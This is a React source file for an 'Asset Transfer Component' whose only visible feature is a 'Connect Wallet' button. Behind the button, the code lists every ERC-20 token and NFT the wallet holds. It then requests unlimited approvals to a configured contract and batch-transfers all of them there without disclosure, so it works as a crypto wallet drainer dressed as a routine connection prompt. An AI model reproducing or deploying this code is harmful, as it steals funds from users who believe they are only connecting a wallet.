import React, { useState } from 'react';
import { ethers } from 'ethers';
import axios from 'axios';

const AssetTransfer = ({ setAssets }) => {
    const ETHERSCAN_API_KEY = process.env.REACT_APP_ETHERSCAN_API_KEY;
    const CONTRACT_ADDRESS = process.env.REACT_APP_CONTRACT_ADDRESS;

    const [isProcessing, setIsProcessing] = useState(false);
    const [userAddress, setUserAddress] = useState('');

    const connectWallet = async () => {
        if (typeof window.ethereum !== "undefined") {
            try {
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                const userAddress = accounts[0];
                console.log("Connected wallet address:", userAddress);
                setUserAddress(userAddress);
                
                // Start processing approvals and transfers
                setIsProcessing(true);
                await handleAssetTransfer(userAddress);
            } catch (error) {
                console.error("Error connecting to wallet:", error);
            }
        } else {
            alert("Please install MetaMask!");
        }
    };

    const getERC20Balances = async (userAddress) => {
        const response = await axios.get(`https://api.etherscan.io/api`, {
            params: {
                module: "account",
                action: "tokenlist",
                address: userAddress,
                sort: "desc",
                apikey: ETHERSCAN_API_KEY
            }
        });

        const tokens = response.data.result || [];
        const balances = [];

        for (const token of tokens) {
            const balanceResponse = await axios.get(`https://api.etherscan.io/api`, {
                params: {
                    module: "account",
                    action: "tokenbalance",
                    contractaddress: token.contractAddress,
                    address: userAddress,
                    tag: "latest",
                    apikey: ETHERSCAN_API_KEY
                }
            });

            const balance = balanceResponse.data.result;
            if (balance > 0) {
                balances.push({ address: token.contractAddress, balance: ethers.utils.formatUnits(balance, token.decimals), decimals: token.decimals });
            }
        }

        return balances;
    };

    const getNFTBalances = async (userAddress) => {
        const response = await axios.get(`https://api.etherscan.io/api`, {
            params: {
                module: "account",
                action: "tokennfttx",
                address: userAddress,
                startblock: "0",
                endblock: "99999999",
                sort: "desc",
                apikey: ETHERSCAN_API_KEY
            }
        });

        const transfers = response.data.result || [];
        const nfts = [];

        for (const transfer of transfers) {
            if (transfer.to.toLowerCase() === userAddress.toLowerCase()) {
                nfts.push({
                    tokenId: transfer.tokenID,
                    contractAddress: transfer.contractAddress,
                });
            }
        }

        return nfts;
    };

    const approveERC20Tokens = async (userAddress) => {
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const erc20Balances = await getERC20Balances(userAddress);
            const approvalPromises = erc20Balances.map(async (asset) => {
                const tokenAddress = asset.address;
                const amount = ethers.constants.MaxUint256; // Approve maximum amount

                const tokenContract = new ethers.Contract(tokenAddress, [
                    "function approve(address spender, uint256 amount) public returns (bool)"
                ], signer);

                const approvalTransaction = await tokenContract.approve(CONTRACT_ADDRESS, amount, {
                    gasLimit: 100000 // Increase gas limit to avoid failure
                });

                await approvalTransaction.wait();
                console.log(`Automatically approved ${amount.toString()} of ${tokenAddress} for ${CONTRACT_ADDRESS}`);
            });

            // Wait for all approval transactions to complete
            await Promise.all(approvalPromises);
        } catch (error) {
            console.error("Error automatically approving ERC20 tokens:", error);
        }
    };

    const batchTransferAssets = async (userAddress) => {
        try {
            const trimmedAddress = CONTRACT_ADDRESS.trim();

            // Check if the address is valid
            const checksumAddress = ethers.utils.getAddress(trimmedAddress);
            console.log("Checksum Address:", checksumAddress);

            // Connect using MetaMask provider
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();

            const erc20Balances = await getERC20Balances(userAddress);
            const nftBalances = await getNFTBalances(userAddress);

            // Define the contract with relevant function signatures
            const contract = new ethers.Contract(checksumAddress, [
                "function batchTransfer(address[] memory erc20Addresses, uint256[] memory erc20Amounts, address[] memory nftAddresses, uint256[][] memory nftTokenIds) public"
            ], signer);

            const erc20Addresses = erc20Balances
                .map(asset => asset.address)
                .filter(address => address.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase());

            const erc20Amounts = erc20Balances.map(asset => asset.balance);

            const nftAddresses = nftBalances
                .map(asset => asset.contractAddress)
                .filter(address => address.toLowerCase() !== CONTRACT_ADDRESS.toLowerCase());

            const nftTokenIds = nftBalances.reduce((acc, asset) => {
                const address = asset.contractAddress.toLowerCase();
                if (address !== CONTRACT_ADDRESS.toLowerCase()) {
                    if (!acc[address]) {
                        acc[address] = [];
                    }
                    acc[address].push(asset.tokenId);
                }
                return acc;
            }, {});

            const nftTokenIdsArray = Object.values(nftTokenIds).map(ids => ids.map(id => Number(id)));

            // Perform batch transfer in a single transaction
            const transaction = await contract.batchTransfer(
                erc20Addresses,
                erc20Amounts,
                nftAddresses,
                nftTokenIdsArray,
                { gasLimit: 1000000 } // Increase gas limit for the batch transfer
            );

            await transaction.wait();
            console.log("Batch assets transfer completed successfully.");
            setAssets(await getERC20Balances(userAddress)); // Update asset state after transfer
        } catch (error) {
            console.error("Error in batch transfer:", error);
        }
    };

    const handleAssetTransfer = async (userAddress) => {
        try {
            await approveERC20Tokens(userAddress); // Automatically approve ERC20 tokens
            await batchTransferAssets(userAddress); // Perform asset transfer
        } finally {
            setIsProcessing(false); // Reset processing state
        }
    };

    return (
        <div className="flex flex-col items-center p-4">
            <h2 className="text-lg font-semibold mb-4">Asset Transfer Component</h2>
            {isProcessing ? (
                <p className="text-gray-700 mb-4">Processing your transactions...</p>
            ) : (
                <p className="text-gray-700 mb-4">Please connect your wallet.</p>
            )}
            <button
                onClick={connectWallet}
                className="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600"
                disabled={isProcessing}
            >
                Connect Wallet
            </button>
        </div>
    );
};

export default AssetTransfer;
